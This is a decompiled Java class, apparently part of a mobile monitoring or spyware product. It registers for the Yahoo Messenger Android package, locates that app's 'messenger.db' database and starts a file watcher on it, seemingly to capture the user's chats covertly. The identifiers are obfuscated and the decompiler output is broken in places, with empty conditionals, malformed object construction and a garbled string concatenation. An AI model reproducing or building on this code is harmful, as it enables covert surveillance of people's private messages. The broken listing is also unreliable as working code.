package com.vvt.capture.yahoo.a;

import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.io.j;
import com.vvt.io.m;
import java.io.File;

public class b
  implements e, m
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private c d;
  private i e;
  private com.vvt.capture.yahoo.a f;
  private j g;
  private boolean h;
  
  public b(com.vvt.capture.yahoo.a parama)
  {
    this.f = parama;
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    bool = true;
    this.h = bool;
    this.e = parami;
    j localj = this.g;
    if (localj == null)
    {
      localj = j.a();
      this.g = localj;
    }
    localj = this.g;
    String str = "com.yahoo.mobile.client.android.im";
    localj.a(str, this);
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    bool = a;
    if (bool) {}
    try
    {
      localc = this.d;
      if (localc != null)
      {
        bool = a;
        if (bool) {}
        localc = this.d;
        localc.stopWatching();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        c localc;
        bool = c;
        if (!bool) {}
      }
    }
    localc = null;
    this.d = null;
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString1, String paramString2) {}
  
  public void b()
  {
    bool = a;
    if (bool) {}
    bool = false;
    Object localObject = null;
    try
    {
      this.h = false;
      localObject = this.d;
      if (localObject != null)
      {
        bool = a;
        if (bool) {}
        localObject = this.d;
        ((c)localObject).stopWatching();
      }
      localObject = this.g;
      if (localObject != null)
      {
        localObject = this.g;
        String str = "com.yahoo.mobile.client.android.im";
        ((j)localObject).a(str);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    localObject = null;
    this.d = null;
    bool = a;
    if (bool) {}
  }
  
  public void b(String paramString1, String paramString2)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    localObject1 = ((StringBuilder)localObject1).append(paramString2);
    Object localObject2 = File.separator;
    localObject1 = (String)localObject2 + "messenger.db";
    localObject2 = new java/io/File;
    ((File)localObject2).<init>((String)localObject1);
    boolean bool2 = ((File)localObject2).exists();
    if (bool2)
    {
      localObject2 = this.d;
      if (localObject2 == null)
      {
        bool2 = b;
        if (bool2) {}
        localObject2 = new com/vvt/capture/yahoo/a/c;
        ((c)localObject2).<init>(this, (String)localObject1);
        this.d = ((c)localObject2);
        localObject1 = this.d;
        ((c)localObject1).startWatching();
      }
    }
    bool1 = a;
    if (bool1) {}
  }
  
  public void c(String paramString1, String paramString2) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/yahoo/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */